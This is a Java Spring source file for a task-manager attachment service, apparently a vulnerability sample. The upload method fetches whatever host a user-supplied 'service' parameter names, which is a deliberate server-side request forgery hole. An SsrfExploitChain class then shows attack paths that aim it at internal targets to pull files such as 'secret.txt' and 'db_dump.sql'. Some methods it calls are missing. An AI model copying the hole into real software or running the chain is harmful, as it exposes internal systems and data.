package com.task.manager.service;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.stereotype.Service;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.util.UriComponentsBuilder;

import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicReference;

@Service
public class AttachmentService {
    @Autowired
    private TaskRepository taskRepository;
    
    @Autowired
    private RestTemplate restTemplate;
    
    private static final List<String> ALLOWED_PROTOCOLS = Arrays.asList("http", "https");
    private static final List<String> PROTECTED_DOMAINS = Arrays.asList("internal-api.example.com");
    
    public boolean verifyAttachmentUrl(String url) {
        if (url == null || url.isEmpty()) {
            return false;
        }
        
        String protocol = url.split("://")[0].toLowerCase();
        if (!ALLOWED_PROTOCOLS.contains(protocol)) {
            return false;
        }
        
        if (url.contains("@")) {
            return false; // 防止带认证信息的URL
        }
        
        return true;
    }
    
    public String uploadFromUrl(String wrapperUrl, String taskId) {
        try {
            if (!verifyAttachmentUrl(wrapperUrl)) {
                throw new IllegalArgumentException("Invalid URL format");
            }
            
            // 解析URL参数
            Map<String, String> params = UriComponentsBuilder.fromUriString(wrapperUrl)
                .build().getQueryParams().toSingleValueMap();
            
            String service = params.get("service");
            String filename = params.get("filename");
            
            if (service == null || filename == null) {
                throw new IllegalArgumentException("Missing required parameters");
            }
            
            // 构造实际请求URL
            String actualUrl = String.format("%s/attachments?name=%s", service, filename);
            
            HttpHeaders headers = new HttpHeaders();
            headers.set("X-Task-ID", taskId);
            
            HttpEntity<String> entity = new HttpEntity<>(headers);
            
            // 发起外部请求
            String response = restTemplate.exchange(
                actualUrl, 
                HttpMethod.GET, 
                entity, 
                String.class
            ).getBody();
            
            // 保存附件到任务
            Task task = taskRepository.findById(taskId);
            task.addAttachment(new Attachment(filename, response.getBytes()));
            taskRepository.save(task);
            
            return "Attachment processed successfully";
            
        } catch (Exception e) {
            // 记录错误但不暴露详细信息
            System.err.println("Attachment processing failed");
            return "Attachment processing failed";
        }
    }
}

// ----------------------------------------
// 漏洞利用链分析类（模拟攻击路径）
// ----------------------------------------
class SsrfExploitChain {
    private final AttachmentService attachmentService;
    private final TaskController taskController;
    
    public SsrfExploitChain(AttachmentService attachmentService, TaskController taskController) {
        this.attachmentService = attachmentService;
        this.taskController = taskController;
    }
    
    // 模拟攻击路径1：通过任务创建入口触发SSRF
    public void exploitViaCreateTask(String internalTarget) {
        // 构造恶意URL参数
        String maliciousUrl = String.format(
            "http://example.com/upload?service=%s&filename=secret.txt", 
            internalTarget
        );
        
        // 创建包含恶意URL的任务
        TaskDTO taskDTO = new TaskDTO();
        taskDTO.setTitle("Exploit Task");
        taskDTO.setDescription("Test task with SSRF");
        taskDTO.setAttachmentUrl(maliciousUrl);
        
        // 触发漏洞
        taskController.createTask(taskDTO);
    }
    
    // 模拟攻击路径2：直接调用服务层接口
    public void exploitDirectCall(String internalTarget) {
        // 构造恶意任务ID
        String taskId = "malicious_task_123";
        
        // 直接调用服务层方法
        attachmentService.uploadFromUrl(
            String.format("http://trusted.com?service=%s&filename=db_dump.sql", internalTarget),
            taskId
        );
    }
}

// ----------------------------------------
// 配套实体类和控制器
// ----------------------------------------

class TaskDTO {
    private String title;
    private String description;
    private String attachmentUrl;
    
    // Getters and setters
    public String getTitle() { return title; }
    public void setTitle(String title) { this.title = title; }
    
    public String getDescription() { return description; }
    public void setDescription(String description) { this.description = description; }
    
    public String getAttachmentUrl() { return attachmentUrl; }
    public void setAttachmentUrl(String attachmentUrl) { this.attachmentUrl = attachmentUrl; }
}

class Task {
    private String id;
    private String title;
    private String description;
    private List<Attachment> attachments;
    
    public Task(String id) {
        this.id = id;
        this.attachments = new java.util.ArrayList<>();
    }
    
    public void addAttachment(Attachment attachment) {
        this.attachments.add(attachment);
    }
    
    // Getters
    public String getId() { return id; }
    public List<Attachment> getAttachments() { return attachments; }
}

class Attachment {
    private String filename;
    private byte[] content;
    
    public Attachment(String filename, byte[] content) {
        this.filename = filename;
        this.content = content;
    }
}

@RestController
@RequestMapping("/api/tasks")
class TaskController {
    @Autowired
    private AttachmentService attachmentService;
    
    @Autowired
    private TaskRepository taskRepository;
    
    @PostMapping
    public ResponseEntity<String> createTask(@RequestBody TaskDTO taskDTO) {
        Task task = new Task(java.util.UUID.randomUUID().toString());
        task.setTitle(taskDTO.getTitle());
        task.setDescription(taskDTO.getDescription());
        
        if (taskDTO.getAttachmentUrl() != null && !taskDTO.getAttachmentUrl().isEmpty()) {
            // 处理附件URL
            String result = attachmentService.uploadFromUrl(taskDTO.getAttachmentUrl(), task.getId());
            if (result.contains("failed")) {
                return ResponseEntity.status(500).body("Task created but attachment failed");
            }
        }
        
        taskRepository.save(task);
        return ResponseEntity.ok("Task created successfully");
    }
}

interface TaskRepository {
    Task findById(String id);
    void save(Task task);
}